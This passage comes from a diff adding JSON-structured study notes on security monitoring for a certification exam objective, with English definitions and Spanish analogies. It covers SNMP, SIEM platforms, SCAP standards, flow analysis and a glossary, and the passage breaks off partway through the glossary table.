**Definition:** The activity of generating summaries or detailed reports based on collected and analyzed data, providing insight into system performance, security incidents, and compliance status.\n\nTools like **Splunk** or **Sumo Logic** can generate reports that demonstrate compliance with data protection regulations and identify areas for continuous improvement.\n\n> *Como el informe final que un detective entrega a sus superiores: resume todo lo investigado en un documento claro y accionable.*\n\n### Alerting and Monitoring Activities: Archiving\n\n* **Definition:** The activity of storing log data, performance data, incident data, and other important data for long-term retention or future reference, often to satisfy regulatory requirements.\n\nTools like **Amazon S3** or **Google Cloud Storage** are used for long-term archiving. **HIPAA**, for example, requires maintaining data for six years to prove compliance.\n\n> *Como guardar cajas de documentos importantes en una bodega en lugar de tirarlos, por si algún día una auditoría los pide de vuelta.*\n\n### Alerting and Monitoring Activities: Alert Response and Remediation/Validation\n\n* **Definition:** The process of taking appropriate action in response to a received alert (investigation, escalation, or predefined procedure), resolving the identified issue (remediation), and confirming the fix was effective (validation).\n\nRemediation might involve patching software, reconfiguring services, or modifying code. Validation involves re-scanning or re-testing to confirm the vulnerability was fully eliminated — not just assumed fixed.\n\n> *Como cuando un médico no solo receta un tratamiento (remediación), sino que además pide un examen de seguimiento para confirmar que el paciente realmente sanó (validación).*\n\n#### Remediation: Quarantining\n\n* **Definition:** A remediation step that involves isolating a suspected malicious system, file, or network segment to prevent the spread of a threat and limit its potential impact.\n\nFor example, a workstation suspected of malware infection is logically isolated from the rest of the network while the security team investigates and remediates.\n\n> *Como aislar a un paciente contagioso en un cuarto separado del hospital mientras se determina qué enfermedad tiene.*\n\n#### Remediation: Alert Tuning\n\n* **Definition:** A remediation step that adjusts alert parameters — thresholds, trigger conditions, or delivery methods — to reduce false positives and improve the relevance of generated alerts.\n\nFor example, retuning a CPU alert to only trigger when utilization stays high for 30–60+ seconds reduces noise from brief, harmless spikes, helping prevent **alert fatigue**.\n\n> *Como ajustar la sensibilidad de una alarma de auto para que no se dispare cada vez que pasa una motocicleta, sino solo ante un impacto real.*\n\n---"
+      },
+      {
+        "name": "Simple Network Management Protocol (SNMP)",
+        "definition": "An internet protocol used for collecting and organizing information about managed devices on IP networks (routers, switches, firewalls, printers, servers, client devices) and for modifying that information to change device behavior.",
+        "analogy": "*Como el sistema de radio de una torre de control de aeropuerto: la torre (manager) se comunica con cada avión (agent) usando mensajes estandarizados para saber su estado y darle instrucciones.*",
+        "tables": [
+          {
+            "headers": [
+              "Trap Type",
+              "Data Sent",
+              "Bandwidth Impact"
+            ],
+            "rows": [
+              [
+                "**Granular**",
+                "Only the changed OID",
+                "Low — conserves resources"
+              ],
+              [
+                "**Verbose**",
+                "Full payload/context of the event",
+                "High — more resource use"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** An internet protocol used for collecting and organizing information about managed devices on IP networks (routers, switches, firewalls, printers, servers, client devices) and for modifying that information to change device behavior.\n\nSNMP architecture consists of **managers** and **agents** communicating through defined message types, with data organized via unique identifiers and stored in a standardized translation file.\n\n> *Como el sistema de radio de una torre de control de aeropuerto: la torre (manager) se comunica con cada avión (agent) usando mensajes estandarizados para saber su estado y darle instrucciones.*\n\n### SNMP: Manager and Agent\n\n* **Definition:** The two architectural roles in SNMP — the manager is the centralized machine (often a server) that collects and processes information; the agent is a background service on each managed device that sends data to the manager at intervals or on request.\n\n> *El manager es el jefe de una oficina que pide reportes; los agents son los empleados que recopilan su propia información y se la entregan cuando se les pide o de forma periódica.*\n\n### SNMP: Message Types (Set, Get, Trap)\n\n* **Definition:** The three message types used by SNMP managers and agents to exchange data: SET (manager-to-agent, changes a variable's value), GET (manager-to-agent, retrieves a variable's value), and TRAP (agent-to-manager, an unsolicited, asynchronous notification of a significant event).\n\nTrap messages differ from SET/GET because the agent sends them without being asked, notifying the manager of events like uptime changes, configuration changes, or unexpected link downtime in near real time.\n\n> *SET y GET son como llamar a un empleado para pedirle un cambio o un reporte; TRAP es como cuando el empleado te llama por su cuenta para avisarte de una emergencia sin que se lo pidieras.*\n\n### SNMP: OID and MIB\n\n* **Definition:** An Object Identifier (OID) is a unique number identifying a specific variable that can be read or set via SNMP; the Management Information Base (MIB) is the translation file that stores and describes the hierarchical structure of all OIDs for a device.\n\nBecause the MIB already contains full details about each OID, SNMP trap messages can send just the changed value for a specific OID instead of retransmitting all known data — conserving bandwidth.\n\n> *El OID es el número de placa de un empleado específico; el MIB es el directorio completo de la empresa que explica quién es cada número de placa y qué hace.*\n\n### SNMP: Variable Binding\n\n* **Definition:** The key-value pair configuration used to store and transmit SNMP trap data, associating each piece of information (e.g., SiteName, Criticality, Severity) with its corresponding value.\n\nExample variable bindings: `SiteName: PR-Branch`, `Criticality: High`, `Severity: Low`, `Alarm Description: High temperature`.\n\n> *Como una ficha médica donde cada dato viene etiquetado: Nombre: Juan, Edad: 30, Presión: Alta — cada etiqueta va pegada a su valor correspondiente.*\n\n### SNMP: Granular vs Verbose Traps\n\n* **Definition:** Two methods of encoding SNMP trap data — granular traps send only a unique OID representing the changed value (bandwidth-efficient), while verbose traps send the full payload of information about the alert or event (resource-intensive).\n\n| Trap Type | Data Sent | Bandwidth Impact |\n| --------- | --------- | ----------------- |\n| **Granular** | Only the changed OID | Low — conserves resources |\n| **Verbose** | Full payload/context of the event | High — more resource use |\n\n> *Granular es como enviar un mensaje de texto corto avisando \"cambio de estado\"; verbose es como enviar un video completo explicando cada detalle del cambio.*\n\n### SNMP: Versions and Security\n\n* **Definition:** The three SNMP versions (v1, v2, v3) with differing security levels; v1 and v2 rely on plaintext community strings as their only access control, while v3 adds integrity (hashing), authentication (source validation), and confidentiality (encryption).\n\nDefault community strings (public read-only, private read-write) in v1/v2 are a major security risk because they are stored and transmitted in plain text. SNMPv3 encrypts using DES (56-bit, weak) by default, upgradeable to 3DES or AES if device firmware supports it. SNMPv3 also groups components into entities with distinct read, write, or read-write authorizations.\n\n> *v1 y v2 son como una puerta con una llave universal escrita en un papel pegado a la puerta; v3 es como cambiar a una cerradura biométrica cifrada con permisos individuales por persona.*\n\n⚠️ **Exam Tip:** SNMPv1 and v2 use insecure plaintext community strings. Always prefer **SNMPv3** for integrity, authentication, and confidentiality.\n\n---"
+      },
+      {
+        "name": "Security Information and Event Management (SIEM)",
+        "definition": "A solution — deployed as software, hardware appliance, or managed service — that provides real-time or near real-time analysis of security alerts generated by network hardware and applications, by aggregating and correlating log data from across the entire organization.",
+        "analogy": "*Como un detective que junta pistas de cámaras de seguridad, testigos y registros telefónicos dispersos, y solo al cruzarlos todos descubre que algo no cuadra — cada pista por separado parecía inofensiva.*",
+        "tables": [
+          {
+            "headers": [
+              "Method",
+              "Data Detail",
+              "Real-Time",
+              "Maintenance"
+            ],
+            "rows": [
+              [
+                "**Agent-based**",
+                "More detailed",
+                "Yes",
+                "Requires install/upkeep on each system"
+              ],
+              [
+                "**Agentless**",
+                "Less detailed",
+                "Slower",
+                "Lower maintenance cost"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Solution",
+              "Vendor/Type",
+              "Key Characteristic"
+            ],
+            "rows": [
+              [
+                "**Splunk**",
+                "Commercial",
+                "Market-leading; connectors for most OS/app formats; Search Processing Language; local or cloud"
+              ],
+              [
+                "**ELK / Elastic Stack**",
+                "Open-source",
+                "Four components: Elasticsearch (query/analytics), Logstash (log collection/normalization), Kibana (visualization), Beats (endpoint collection agents)"
+              ],
+              [
+                "**ArcSight**",
+                "Commercial",
+                "SIEM log management/analytics; compliance reporting (HIPAA, SOX, PCI DSS)"
+              ],
+              [
+                "**QRadar**",
+                "Commercial (IBM)",
+                "SIEM log management, analytics, and compliance reporting platform"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A solution — deployed as software, hardware appliance, or managed service — that provides real-time or near real-time analysis of security alerts generated by network hardware and applications, by aggregating and correlating log data from across the entire organization.\n\nA SIEM's core value is **correlation**: connecting disparate log sources (e.g., a VPN login log and a physical badge-access log) to reveal issues that would be invisible when reviewed separately, such as impossible travel (a user appearing to be in two places at once).\n\n> *Como un detective que junta pistas de cámaras de seguridad, testigos y registros telefónicos dispersos, y solo al cruzarlos todos descubre que algo no cuadra — cada pista por separado parecía inofensiva.*\n\n### SIEM: Agent-Based vs Agentless Collection\n\n* **Definition:** Two methods of log collection used by SIEMs — agent-based installs a small software agent on each monitored system for real-time, detailed data collection; agentless collects log data directly using standard protocols like SNMP or WMI without installing software.\n\n| Method | Data Detail | Real-Time | Maintenance |\n| ------ | ----------- | --------- | ----------- |\n| **Agent-based** | More detailed | Yes | Requires install/upkeep on each system |\n| **Agentless** | Less detailed | Slower | Lower maintenance cost |\n\n> *Agent-based es como tener un reportero personal en cada oficina; agentless es como hacer llamadas periódicas para preguntar qué está pasando, sin tener a nadie físicamente ahí.*\n\n### SIEM: Deployment Considerations\n\n* **Definition:** The seven planning steps required to effectively deploy a SIEM: logging relevant events, establishing scope, developing threat-defining use cases, planning incident response actions, establishing a ticketing process, scheduling regular threat hunting, and providing an evidence trail for auditors.\n\n1. Log all relevant events; filter out irrelevant data.\n2. Establish and document the scope of monitored events.\n3. Develop use cases to define what constitutes a threat.\n4. Plan pre-defined incident response actions for given threats.\n5. Establish a ticketing process to track flagged events.\n6. Schedule regular threat hunting to catch what alerts missed.\n7. Provide auditors and analysts an accessible evidence trail.\n\n> *Como planear la apertura de una nueva sucursal bancaria: primero decides qué vigilar, luego documentas las reglas, preparas protocolos de emergencia, un sistema de reportes de incidentes, rondas de inspección regulares, y un archivo listo para auditorías.*\n\n### SIEM: Common SIEM Solutions\n\n* **Definition:** Commercial and open-source SIEM platforms widely used in the industry, including Splunk, ELK/Elastic Stack, ArcSight, and QRadar.\n\n| Solution | Vendor/Type | Key Characteristic |\n| -------- | ----------- | ------------------- |\n| **Splunk** | Commercial | Market-leading; connectors for most OS/app formats; Search Processing Language; local or cloud |\n| **ELK / Elastic Stack** | Open-source | Four components: Elasticsearch (query/analytics), Logstash (log collection/normalization), Kibana (visualization), Beats (endpoint collection agents) |\n| **ArcSight** | Commercial | SIEM log management/analytics; compliance reporting (HIPAA, SOX, PCI DSS) |\n| **QRadar** | Commercial (IBM) | SIEM log management, analytics, and compliance reporting platform |\n\n> *Elegir un SIEM es como elegir un idioma: al final del día, casi siempre usarás el que ya habla tu empresa, no necesariamente el \"mejor\" en abstracto.*\n\n---"
+      },
+      {
+        "name": "Data from Security Tools",
+        "definition": "The objective domain (4.4) covering the different categories of log, event, and incident data generated by core security tools — antivirus, DLP, NIDS/NIPS, firewalls, and vulnerability scanners — that feed into a SIEM for consolidated analysis.",
+        "analogy": "*Como los sentidos del cuerpo humano: la vista, el oído y el tacto capturan información distinta, pero es el cerebro (el SIEM) el que junta todo para entender la situación completa.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the different categories of log, event, and incident data generated by core security tools — antivirus, DLP, NIDS/NIPS, firewalls, and vulnerability scanners — that feed into a SIEM for consolidated analysis.\n\nEach tool generates a different \"slice\" of visibility; only when consolidated in a SIEM do these slices combine into a holistic security posture view.\n\n> *Como los sentidos del cuerpo humano: la vista, el oído y el tacto capturan información distinta, pero es el cerebro (el SIEM) el que junta todo para entender la situación completa.*\n\n### Data Sources: Antivirus Software\n\n* **Definition:** A fundamental security tool that protects systems against malware (viruses, worms, trojans, ransomware, spyware) and generates data such as malware detection logs, scan results, and update status.\n\nIf a system repeatedly reports malware infections, sending that data to a SIEM helps determine whether the issue is isolated or spreading — a sign of a larger coordinated attack.\n\n> *Como el sistema inmunológico de un cuerpo: no solo combate la infección, también registra cuántas veces atacó y qué tan grave fue cada episodio.*\n\n### Data Sources: Data Loss Prevention (DLP)\n\n* **Definition:** Systems that monitor and control data at endpoints, in network traffic, and in cloud storage to prevent potential data breaches, generating data about leak attempts, policy violations, and suspicious user activity.\n\nExample: a DLP system flags an attempt to email a list of client names and contact information outside the organization, alerting the security team for timely corrective action.\n\n> *Como un guardia de aduana que revisa las maletas antes de que salgan del país: si detecta algo prohibido, lo detiene antes de que cruce la frontera.*\n\n### Data Sources: NIDS and NIPS\n\n* **Definition:** Network Intrusion Detection Systems (NIDS) passively monitor network traffic and generate alerts on detected threats; Network Intrusion Prevention Systems (NIPS) proactively block or prevent those threats from accessing the network.\n\nData from both — detected threats, blocked traffic, network anomalies — feeds a SIEM to reveal patterns of malicious activity and measure the effectiveness of prevention measures.\n\n> *NIDS es como una cámara de seguridad que solo graba y avisa; NIPS es como un guardia que además interviene físicamente para detener al intruso.*\n\n### Data Sources: Firewalls\n\n* **Definition:** Devices that serve as a barrier between trusted internal and untrusted external networks, filtering traffic based on predetermined Access Control Lists (ACLs) and generating logs of allowed/blocked traffic, rule changes, and detected threats.\n\nExample: a port scan against a web server (probing ports 0–1023) shows up in firewall logs as reconnaissance activity, an early indicator of a potential attack.\n\n> *Como el portero de un edificio con una lista de invitados: registra a quién dejó pasar, a quién rechazó y cualquier intento sospechoso de entrada.*\n\n### Data Sources: Vulnerability Scanners\n\n* **Definition:** Tools that identify security weaknesses in a system — missing patches, misconfigurations, known vulnerabilities — and generate data about the vulnerabilities found, their severity, and recommended remediation.\n\nFeeding this data into a SIEM allows organizations to prioritize remediation by severity/impact and track remediation progress over time.\n\n> *Como un inspector de salud que revisa un restaurante y entrega una lista de todo lo que está mal, ordenada de lo más urgente a lo menos urgente.*\n\n---"
+      },
+      {
+        "name": "Security Content Automation Protocol (SCAP)",
+        "definition": "A suite of open standards, developed by NIST, that enhances the automation of vulnerability management, security measurement, and policy compliance evaluation across an organization's deployed systems.",
+        "analogy": "*Como un tratado internacional que obliga a todos los países a usar el mismo sistema de medidas (metros, kilos): así cualquier herramienta puede \"hablar\" con cualquier otra sin traducción.*",
+        "tables": [
+          {
+            "headers": [
+              "Score Range",
+              "Qualitative Rating"
+            ],
+            "rows": [
+              [
+                "0",
+                "None"
+              ],
+              [
+                "0.1 – 3.9",
+                "Low"
+              ],
+              [
+                "4.0 – 6.9",
+                "Medium"
+              ],
+              [
+                "7.0 – 8.9",
+                "High"
+              ],
+              [
+                "9.0 – 10.0",
+                "Critical"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A suite of open standards, developed by NIST, that enhances the automation of vulnerability management, security measurement, and policy compliance evaluation across an organization's deployed systems.\n\nSCAP standardizes the \"language\" that scanning tools use, so tools from different vendors can exchange results seamlessly. It relies on three core languages (OVAL, XCCDF, ARF) and three enumeration schemes (CCE, CPE, CVE), plus the CVSS scoring system and configuration benchmarks.\n\n> *Como un tratado internacional que obliga a todos los países a usar el mismo sistema de medidas (metros, kilos): así cualquier herramienta puede \"hablar\" con cualquier otra sin traducción.*\n\n### SCAP: OVAL\n\n* **Definition:** The Open Vulnerability and Assessment Language — an XML schema for describing system security states, machine configurations, and querying vulnerability reports in a consistent, interoperable way regardless of the scanning tool used.\n\n> *Como un formulario estándar de reporte médico: sin importar el hospital, todos los doctores llenan los mismos campos y todos se entienden.*\n\n### SCAP: XCCDF\n\n* **Definition:** The Extensible Configuration Checklist Description Format — an XML schema used for developing and auditing best-practice configuration checklists and rules in a machine-readable format.\n\nBefore XCCDF, best-practice guides were long documents (30–50+ pages) manually checked step by step. XCCDF allows automated tools to validate systems against these guidelines, and can still be used as a manual checklist if the tool lacks automation support.\n\n> *Como convertir un manual de instrucciones en papel de 50 páginas en una lista de chequeo digital que una máquina puede marcar automáticamente.*\n\n### SCAP: ARF\n\n* **Definition:** The Asset Reporting Format — an XML schema used to express information about assets and the relationships between assets and reports, facilitating reporting and correlation of asset data across organizations.\n\nARF is vendor- and technology-neutral, making it flexible and well-suited to a wide variety of reporting applications.\n\n> *Como una etiqueta universal de inventario que cualquier tienda, sin importar la marca de su sistema, puede leer y entender de la misma manera.*\n\n### SCAP: CCE\n\n* **Definition:** The Common Configuration Enumeration — a scheme providing unique identifiers for secure configuration best-practice statements, enabling automated verification and correlation of configuration data across multiple sources and tools.\n\n> *Como un código de barras único para cada regla de configuración recomendada, para que distintos sistemas puedan referirse exactamente a la misma regla.*\n\n### SCAP: CPE\n\n* **Definition:** The Common Platform Enumeration — a machine-readable scheme for identifying hardware devices, operating systems, and applications, formatted as `cpe:/part:vendor:product:version:update:edition:language`.\n\nThe `part` field indicates whether the platform is an Operating System (O), an Application (A), or Hardware (H).\n\n> *Como una matrícula de vehículo estandarizada: con un solo vistazo al formato, sabes exactamente qué tipo de vehículo es, quién lo fabricó y qué versión es.*\n\n### SCAP: CVE\n\n* **Definition:** The Common Vulnerabilities and Exposures — a list of records, maintained by MITRE, where each entry has a unique identifier (`CVE-YEAR-NUMBER`) describing a publicly known vulnerability.\n\nExample: **CVE-2017-0144**, nicknamed **EternalBlue**, is an SMB protocol vulnerability in Microsoft Windows exploited by the **WannaCry** ransomware in 2017. Patching or disabling SMBv1 mitigated the exposure.\n\n> *Como el número de expediente único de un caso judicial: con solo ese número puedes encontrar todos los detalles, referencias y soluciones asociadas a ese caso específico.*\n\n### SCAP: CVSS\n\n* **Definition:** The Common Vulnerability Scoring System — a numerical scoring standard (current version CVSS 3) that rates vulnerability severity from 0 to 10, translated into a qualitative rating.\n\n| Score Range | Qualitative Rating |\n| ----------- | ------------------- |\n| 0 | None |\n| 0.1 – 3.9 | Low |\n| 4.0 – 6.9 | Medium |\n| 7.0 – 8.9 | High |\n| 9.0 – 10.0 | Critical |\n\n⚠️ **Exam Tip:** A CVSS score does **not** account for existing mitigations. EternalBlue scores 8.1 (High), but a network with SMBv1 already disabled is not actually at risk from it — so real-world priority should factor in compensating controls, not the raw score alone.\n\n> *Es como la calificación de riesgo de un huracán: te dice qué tan fuerte es la tormenta, pero no si tu casa ya tiene refuerzos que la protegen de ese nivel de viento.*\n\n### SCAP: Benchmarks\n\n* **Definition:** A set of configuration rules for a specific product, expressed in XCCDF format, providing a detailed checklist to secure systems to a specific baseline.\n\nExamples include the **Red Hat Enterprise Linux Benchmarks** and the **CIS Microsoft Windows 10 Enterprise Benchmark**, covering areas like authentication, firewall settings, system logging, and user account control.\n\n> *Como una receta de seguridad estandarizada y certificada: sigue estos pasos exactos y tu sistema queda configurado según las mejores prácticas de la industria.*\n\n---"
+      },
+      {
+        "name": "NetFlow and Flow Analysis",
+        "definition": "The objective domain (4.4) covering the collection and analysis of network traffic metadata (flow analysis) as a lightweight alternative to full packet capture, used to identify traffic patterns, trends, and anomalies.",
+        "analogy": "*Como decidir entre grabar cada palabra de todas las llamadas telefónicas de una empresa (captura completa) o simplemente llevar un registro de quién llamó a quién, cuándo y por cuánto tiempo (análisis de flujo).*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the collection and analysis of network traffic metadata (flow analysis) as a lightweight alternative to full packet capture, used to identify traffic patterns, trends, and anomalies.\n\n> *Como decidir entre grabar cada palabra de todas las llamadas telefónicas de una empresa (captura completa) o simplemente llevar un registro de quién llamó a quién, cuándo y por cuánto tiempo (análisis de flujo).*\n\n### Flow Analysis: Full Packet Capture (FPC)\n\n* **Definition:** The capture of the entire contents of network packets, including both header and payload, requiring significant storage space.\n\nFull packet capture provides complete visibility into transmitted content but scales poorly — even a small home network can generate multiple gigabytes of captured data per day.\n\n> *Como grabar en video cada segundo de todo lo que pasa en una casa: tienes todo el detalle, pero el disco duro se llena rapidísimo.*\n\n### Flow Analysis: Flow Collector and Metadata\n\n* **Definition:** A means of recording metadata and statistics about network traffic (protocol used, volume, source/destination) rather than the full content of each packet, saving storage and processing resources.\n\nFlow analysis reveals *what kind* of traffic was sent and *how much*, but not the actual content — analogous to a phone bill showing who called whom and for how long, without recording the conversation itself.\n\n> *Como la factura detallada de tu teléfono: sabes a quién llamaste y cuánto duró la llamada, pero no sabes qué se dijo.*\n\n### Flow Analysis: NetFlow / IPFIX\n\n* **Definition:** NetFlow is a Cisco-developed protocol for reporting network flow information to a structured database; it became the industry standard under the name IPFIX (IP Flow Information Export), defining a traffic flow based on packets sharing common characteristics.\n\nNetFlow data includes the network protocol/interface, IP version and type, source/destination IP addresses and ports, and type of service — visualized with tools like **SolarWinds**.\n\n> *Como el registro de vuelos de un aeropuerto: sabes qué avión salió, de dónde a dónde y a qué hora, sin necesidad de revisar el equipaje de cada pasajero.*\n\n### Flow Analysis: Zeek\n\n* **Definition:** A hybrid network monitoring tool that passively samples traffic like a flow collector but also logs full packet captures for data flagged as interesting based on filters or signatures.\n\nZeek normalizes data into tab-delimited or JSON format for import into other analysis tools, such as Splunk, combining the efficiency of flow analysis with the depth of full packet capture only where it matters.\n\n> *Como un guardia que normalmente solo toma notas rápidas de quién entra y sale, pero que saca la cámara de video completa únicamente cuando algo le parece sospechoso.*\n\n### Flow Analysis: MRTG\n\n* **Definition:** The Multi Router Traffic Grapher — a tool that creates graphs showing network traffic flow through router and switch interfaces by polling those devices using SNMP.\n\nMRTG graphs help reveal patterns, such as an unexplained traffic spike between 2:00 AM and 4:00 AM, which could indicate a legitimate offsite backup or a sign of data exfiltration requiring further investigation (e.g., deploying a network sniffer).\n\n> *Como un electrocardiograma del tráfico de red: te muestra la línea de \"latidos\" normales, y cualquier pico fuera de lo esperado merece que un médico lo revise más de cerca.*\n\n---"
+      },
+      {
+        "name": "Single Pane of Glass (SPOG)",
+        "definition": "A central point of access that consolidates all the information, tools, and systems a security team needs — logs, alerts, reports — into one unified view, eliminating the need to log into multiple separate systems.",
+        "analogy": "*Como el tablero de control de un piloto de avión: en lugar de revisar veinte pantallas separadas en distintas cabinas, todo lo esencial está visible en un solo panel frente a él.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A central point of access that consolidates all the information, tools, and systems a security team needs — logs, alerts, reports — into one unified view, eliminating the need to log into multiple separate systems.\n\nA single pane of glass simplifies security operations management, improves threat detection/response speed, automates repetitive tasks, improves team collaboration, and eases regulatory compliance reporting.\n\n> *Como el tablero de control de un piloto de avión: en lugar de revisar veinte pantallas separadas en distintas cabinas, todo lo esencial está visible en un solo panel frente a él.*\n\n### SPOG: Implementation Steps\n\n* **Definition:** The five sequential steps used to implement a single pane of glass in a Security Operations Center: defining requirements, identifying/integrating data sources, customizing the interface, developing SOPs and documentation, and continuously monitoring/maintaining the solution.\n\n1. **Define the requirements:** Identify what information, tools, and systems the security team needs.\n2. **Identify and integrate data sources:** Connect log servers, IDS, and other sources via APIs, webhooks, plugins, or connectors.\n3. **Customize the interface:** Design a clear, organized layout that supports fast, informed decisions.\n4. **Develop SOPs and documentation:** Ensure consistency and repeatability in how the team uses the tool.\n5. **Continuously monitor and maintain:** Regularly review data, adjust configuration, and secure the platform against unauthorized access, since it houses all critical security data.\n\n> *Como abrir un nuevo centro de control de tráfico aéreo: primero decides qué necesitas ver, luego conectas los radares, diseñas la pantalla, entrenas al personal con manuales, y por último mantienes todo actualizado y protegido.*\n\n---"
+      },
+      {
+        "name": "Key Terms Glossary",
+        "definition": "Baseline: Established normal performance metrics used as a reference point to detect deviations",
+        "analogy": "",
+        "tables": [
+          {
+            "headers": [
+              "Term",
+              "Definition"
+            ],
+            "rows": [
+              [
+                "**Baseline**",
+                "Established normal performance metrics used as a reference point to detect deviations"
+              ],
+              [
+                "**System monitoring**",
+                "Tracking CPU, memory, disk, and network performance of a computer system"
+              ],
+              [
+                "**Application monitoring (APM)**",
+                "Tracking errors, bottlenecks, and response times of software applications"
+              ],
+              [
+                "**Infrastructure monitoring**",
+                "Observing performance/availability of physical and virtual infrastructure"
+              ],
+              [
+                "**Log aggregation**",
+                "Collecting and consolidating log data into a centralized location"
+              ],
+              [
+                "**Alerting**",
+                "Setting up notifications for predefined events, thresholds, or anomalies"
+              ],
+              [
+                "**Alert fatigue**",
+                "Desensitization of security personnel caused by excessive, low-value alerts"
+              ],
+              [
+                "**Vulnerability scan**",
+                "A scan comparing systems against a database of known CVEs"
+              ],
+              [
+                "**Configuration scan**",
+                "A scan comparing system configuration against best-practice benchmarks"
+              ],
+              [
+                "**Code scan**",
+                "A scan of application source code for vulnerabilities or coding errors"
+              ],
+              [
+                "**SAST**",
+                "Static Application Security Testing — code analysis before execution"
+              ],
+              [
+                "**DAST**",
+                "Dynamic Application Security Testing — analysis of a running application"
+              ],
+              [
+                "**Reporting**",
+                "Generating summaries/detailed reports from collected security data"
+              ],
+              [
+                "**Archiving**",
+                "Long-term retention of log, performance, and incident data"
+              ],
+              [
+                "**Remediation**",
+                "Steps taken to resolve an identified vulnerability or issue"
+              ],
+              [
+                "**Validation**",
+                "Verifying that a remediation was successful"
+              ],
+              [
+                "**Quarantining**",
+                "Isolating a suspected malicious system to limit threat spread"
+              ],
+              [
+                "**Alert tuning**",
+                "Adjusting alert thresholds/conditions to reduce false positives"
+              ],
+              [
+                "**SNMP**",
+                "Simple Network Management Protocol — collects/modifies managed device info"
+              ],
+              [
+                "**SNMP Manager**",
+                "The centralized node collecting/processing SNMP data from agents"
+              ],
+              [
+                "**SNMP Agent**",
+                "The background service on a managed device sending data to the manager"
+              ],
+              [
+                "**SET message**",
+                "SNMP manager-to-agent request to change a variable's value"
+              ],
+              [
+                "**GET message**",
+                "SNMP manager-to-agent request to retrieve a variable's value"
+              ],
+              [
+                "**TRAP message**",
+                "SNMP agent-to-manager unsolicited event notification"
+              ],
+              [
+                "**OID**",
+                "Object Identifier — unique number identifying an SNMP variable"
+              ],
+              [
+                "**MIB**",
+                "Management Information Base — translation file describing all OIDs"
+              ],
+              [
+                "**Variable binding**",
+                "Key-value pair format used to transmit SNMP trap data"
+              ],
+              [
+                "**Granular trap**",
+                "SNMP trap sending only the changed OID (bandwidth-efficient)"
+              ],
+              [
+                "**Verbose trap**",
+                "SNMP trap sending the full event payload (resource-intensive)"
+              ],
+              [
+                "**Community string**",
+                "Plaintext shared-secret access mechanism used in SNMPv1/v2 (insecure)"
+              ],
+              [
+                "**SIEM**",
+                "Security Information and Event Management — real-time security data correlation"
+              ],
+              [
+                "**Agent-based collection**",
+                "SIEM log collection method using an installed software agent"
+              ],
+              [
+                "**Agentless collection**",
+                "SIEM log collection method using standard protocols (SNMP, WMI) without agents"
+              ],
+              [
+                "**Splunk**",
+                "Commercial big-data SIEM with Search Processing Language"
+              ],
+              [
+                "**ELK / Elastic Stack**",
+                "Open-source SIEM stack: Elasticsearch, Logstash, Kibana, Beats"
+              ],
+              [
+                "**ArcSight**",
+                "Commercial SIEM focused on compliance reporting"
+              ],
+              [
+                "**QRadar**",
+                "IBM's commercial SIEM log management and analytics platform"
+              ],
+              [
+                "**DLP**",
+                "Data Loss Prevention — monitors/controls data to prevent breaches"
+              ],
+              [
+                "**NIDS**",
+                "Network Intrusion Detection System — passively detects and alerts on threats"
+              ],
+              [
+                "**NIPS**",
+                "Network Intrusion Prevention System — proactively blocks threats"
+              ],
+              [
+                "**ACL**",
+                "Access Control List — rule set used by firewalls to filter traffic"
+              ],
+              [
+                "**SCAP**",
+                "Security Content Automation Protocol — NIST standard for automating vulnerability/compliance management"
+              ],
+              [
+                "**OVAL**",
+                "Open Vulnerability and Assessment Language — XML schema for system security states"
+              ],
+              [
+                "**XCCDF**",
+                "Extensible Configuration Checklist Description Format — machine-readable best-practice checklists"
+              ],
+              [
+                "**ARF**",
+                "Asset Reporting Format — XML schema for asset/report relationships"
+              ],
+              [
+                "**CCE**",
+                "Common Configuration Enumeration — identifiers for configuration best practices"
+              ],
+              [
+                "**CPE**",
+                "Common Platform Enumeration — identifiers for hardware/OS/application platforms"
+              ],
+              [
+                "**CVE**",
+                "Common Vulnerabilities and Exposures — unique identifiers for known vulnerabilities"
+              ],
+              [
+                "**CVSS**",
+                "Common Vulnerability Scoring System — 0–10 severity scoring standard"
+              ],
+              [
+                "**Benchmark**",
+                "A set of configuration rules securing a system to a specific baseline"
+              ],
+              [
+                "**EternalBlue**",
+                "Nickname for CVE-2017-0144, an SMB vulnerability exploited by WannaCry"
+              ],
+              [
+                "**Full packet capture (FPC)**",
+                "Capturing entire packet contents, including header and payload"
+              ],
+              [
+                "**Flow analysis**",
+                "Collecting network traffic metadata instead of full packet contents"
+              ],
+              [
+                "**NetFlow**",
+                "Cisco-developed protocol for reporting network flow data"
+              ],
+              [
+                "**IPFIX**",
+                "IP Flow Information Export — the standardized evolution of NetFlow"
+              ],
+              [
+                "**Zeek**",
+                "Hybrid tool combining flow sampling with selective full packet capture"
+              ],
+              [
+                "**MRTG**",
+                "Multi Router Traffic Grapher — graphs traffic via SNMP polling"
+              ],
+              [
+                "**Single Pane of Glass (SPOG)**",
+                "A unified dashboard consolidating all security information and tools"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "| Term | Definition |\n| ---- | ---------- |\n| **Baseline** | Established normal performance metrics used as a reference point to detect deviations |\n| **System monitoring** | Tracking CPU, memory, disk, and network performance of a computer system |\n| **Application monitoring (APM)** | Tracking errors, bottlenecks, and response times of software applications |\n| **Infrastructure monitoring** | Observing performance/availability of physical and virtual infrastructure |\n| **Log aggregation** | Collecting and consolidating log data into a centralized location |\n| **Alerting** | Setting up notifications for predefined events, thresholds, or anomalies |\n| **Alert fatigue** | Desensitization of security personnel caused by excessive, low-value alerts |\n| **Vulnerability scan** | A scan comparing systems against a database of known CVEs |\n| **Configuration scan** | A scan comparing system configuration against best-practice benchmarks |\n| **Code scan** | A scan of application source code for vulnerabilities or coding errors |\n| **SAST** | Static Application Security Testing — code analysis before execution |\n| **DAST** | Dynamic Application Security Testing — analysis of a running application |\n| **Reporting** | Generating summaries/detailed reports from collected security data |\n| **Archiving** | Long-term retention of log, performance, and incident data |\n| **Remediation** | Steps taken to resolve an identified vulnerability or issue |\n| **Validation** | Verifying that a remediation was successful |\n| **Quarantining** | Isolating a suspected malicious system to limit threat spread |\n| **Alert tuning** | Adjusting alert thresholds/conditions to reduce false positives |\n| 